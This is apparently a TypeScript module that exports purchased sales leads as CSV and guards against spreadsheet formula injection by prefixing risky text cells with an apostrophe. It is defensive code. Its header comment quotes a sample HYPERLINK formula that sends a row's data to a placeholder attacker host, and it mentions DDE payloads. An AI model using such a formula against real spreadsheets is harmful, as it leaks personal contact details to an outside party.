/**
 * The purchased-lead CSV (S-12, S-13), in one place.
 *
 * WHY THIS IS SHARED AND NOT THREE SERIALISERS
 * Sample mode, the Builder sample and the connected backend each had their
 * own, and two of them disagreed about the column set, so one requirement
 * produced different files depending on which console asked. They all map to
 * `PurchasedExportRow` and call `purchasedLeadsCsv`.
 *
 * WHY CSV QUOTING IS NOT ENOUGH
 * Quoting decides how a *parser* reads a field. It says nothing about how a
 * spreadsheet *evaluates* one. Excel, LibreOffice Calc and Google Sheets all
 * treat a cell whose first meaningful character is `=`, `+`, `-` or `@` as a
 * formula, inside quotes or not, and they skip leading whitespace, tabs and
 * carriage returns when deciding. This file holds contact details and free
 * text a prospect typed, so a requirement of `=1+1` used to be emitted as a
 * formula-capable cell.
 *
 * That is two problems, not one:
 *
 *   1. Injection. `=HYPERLINK("http://attacker.example/?d="&A1,"Click")` in a
 *      requirement becomes a live link in the buyer's spreadsheet, carrying
 *      the row beside it. The family also covers DDE payloads.
 *   2. Silent corruption, which bites every single export. A mobile number
 *      `+919800000001` is a formula to a spreadsheet: it evaluates to the
 *      number 919800000001 and the `+` and its meaning are gone. Every
 *      international number in every export was already being mangled.
 *
 * WHAT THIS DOES ABOUT IT
 * One rule for every untrusted text column: look past the characters a
 * spreadsheet ignores, and if the first meaningful character is a trigger,
 * prefix the cell with a single apostrophe and quote it. An apostrophe is
 * how a spreadsheet is told "this is text" — Excel and LibreOffice consume
 * it and show the original, so `+919800000001` displays as typed instead of
 * as 919,800,000,001.
 *
 * INTENTIONAL CHANGE TO EXPORTED TEXT
 * In a plain text editor, `grep`, or a CSV parser that does not strip it, a
 * neutralised cell reads `'+919800000001` rather than `+919800000001`. That
 * apostrophe is real bytes in the file. It is the accepted cost: without it
 * the value is silently rewritten by the application most buyers will open
 * this in. Only cells whose first meaningful character is a trigger carry
 * one — an ordinary name or requirement is byte-identical to before.
 *
 * NOT VERIFIED IN A SPREADSHEET. No Excel, LibreOffice or Google Sheets run
 * was performed for this change. The behaviour described above is the
 * documented and widely published behaviour of those applications, and the
 * tests here assert what this function emits, not what any spreadsheet then
 * does with it.
 *
 * WHAT IS LEFT ALONE
 * Numeric columns — credits paid and intent score — are declared `number`
 * and are never neutralised, so they stay numeric and can be summed. A
 * non-finite number is emitted as empty rather than as `NaN`, which is not a
 * number a spreadsheet can use either.
 *
 * No byte-order mark is written. It would help Excel on Windows read
 * non-Latin names, which the current file does not guarantee, but it also
 * breaks naive parsers that do not expect one. Changing the file's bytes for
 * every consumer is a decision for whoever owns the format, so it is
 * recorded here and not taken.
 */

/** One row, independent of which service produced it. */
export type PurchasedExportRow = {
  readonly leadId: string;
  readonly orderReference: string;
  readonly purchasedAt: string;
  readonly requirement: string | null;
  readonly area: string | null;
  readonly configuration: string | null;
  readonly budgetBand: string | null;
  /** Null until the question-to-level mapping is confirmed. Not a zero. */
  readonly intentScore: number | null;
  readonly name: string | null;
  readonly mobile: string | null;
  readonly email: string | null;
  readonly bestTimeToCall: string | null;
  readonly creditsPaid: number | null;
};

/**
 * A column's kind is declared, not inferred from the value at runtime.
 *
 * Inferring it with `typeof` would mean a backend that sent a credit amount
 * as a string silently moved that column into the text rules, and a column's
 * treatment would depend on the data rather than on what the column is.
 */
type ColumnKind = "text" | "number";

type Column = {
  readonly heading: string;
  readonly kind: ColumnKind;
  readonly read: (row: PurchasedExportRow) => string | number | null;
};

const COLUMNS: readonly Column[] = [
  { heading: "Lead", kind: "text", read: (r) => r.leadId },
  { heading: "Order", kind: "text", read: (r) => r.orderReference },
  { heading: "Purchased", kind: "text", read: (r) => r.purchasedAt },
  { heading: "Requirement", kind: "text", read: (r) => r.requirement },
  { heading: "Area", kind: "text", read: (r) => r.area },
  { heading: "Configuration", kind: "text", read: (r) => r.configuration },
  { heading: "Budget band", kind: "text", read: (r) => r.budgetBand },
  { heading: "Intent score", kind: "number", read: (r) => r.intentScore },
  { heading: "Name", kind: "text", read: (r) => r.name },
  { heading: "Mobile", kind: "text", read: (r) => r.mobile },
  { heading: "Email", kind: "text", read: (r) => r.email },
  { heading: "Best time to call", kind: "text", read: (r) => r.bestTimeToCall },
  { heading: "Credits paid", kind: "number", read: (r) => r.creditsPaid },
];

/**
 * The characters a spreadsheet skips before deciding whether a cell is a
 * formula. Space, tab, newline and carriage return are the documented ones;
 * the C0 range, a non-breaking space, the zero-width family and a stray
 * byte-order mark are included because a cell beginning with one of those
 * followed by `=` is the standard way a naive first-character check is
 * walked past.
 */
const IGNORED_LEADING = /^[\s\u0000-\u001F\u007F\u00A0\u200B-\u200D\u2060\uFEFF]+/u;

/** Characters that make a spreadsheet evaluate a cell instead of showing it. */
const FORMULA_TRIGGERS = new Set(["=", "+", "-", "@"]);

/** The marker that tells a spreadsheet the cell is text. */
const TEXT_MARKER = "'";

/**
 * Whether a spreadsheet would evaluate this text rather than display it.
 *
 * Exported for the tests, and for anybody adding another export: the rule is
 * worth reading once rather than guessing at.
 */
export function wouldSpreadsheetEvaluate(text: string): boolean {
  const significant = text.replace(IGNORED_LEADING, "");
  if (significant.length === 0) return false;
  return FORMULA_TRIGGERS.has(significant[0]!);
}

/** RFC 4180 quoting. Quoting is about parsing, and nothing more. */
function quoteIfNeeded(text: string): string {
  return /[",\r\n\t]/.test(text) ? `"${text.replace(/"/g, '""')}"` : text;
}

function textCell(value: string | number | null | undefined): string {
  if (value === null || value === undefined) return "";
  const text = String(value);
  if (text.length === 0) return "";
  // The original value is kept whole. The marker goes in front of it, not in
  // place of anything, so nothing the prospect typed is dropped or rewritten.
  const safe = wouldSpreadsheetEvaluate(text) ? `${TEXT_MARKER}${text}` : text;
  return quoteIfNeeded(safe);
}

function numberCell(value: string | number | null | undefined): string {
  if (value === null || value === undefined || value === "") return "";
  const amount = typeof value === "number" ? value : Number(value);
  // A column declared numeric that is handed something unusable is emitted
  // empty. `NaN` and `Infinity` are not numbers a spreadsheet can total, and
  // writing them would put a word in a column somebody will sum.
  if (!Number.isFinite(amount)) return "";
  return String(amount);
}

function cell(column: Column, row: PurchasedExportRow): string {
  const value = column.read(row);
  return column.kind === "number" ? numberCell(value) : textCell(value);
}

export function purchasedLeadsCsv(rows: readonly PurchasedExportRow[]): string {
  const lines = [COLUMNS.map((column) => column.heading).join(",")];
  for (const row of rows) {
    lines.push(COLUMNS.map((column) => cell(column, row)).join(","));
  }
  return `${lines.join("\r\n")}\r\n`;
}

/** The headings, in order. For a test or another export that must match. */
export const PURCHASED_EXPORT_HEADINGS: readonly string[] =
  COLUMNS.map((column) => column.heading);

/** The filename both modes use, so a reviewer gets the same file either way. */
export function purchasedLeadsFilename(now: Date = new Date()): string {
  return `kkl-purchased-leads-${now.toISOString().slice(0, 10)}.csv`;
}

export const PURCHASED_EXPORT_CONTENT_TYPE = "text/csv; charset=utf-8";
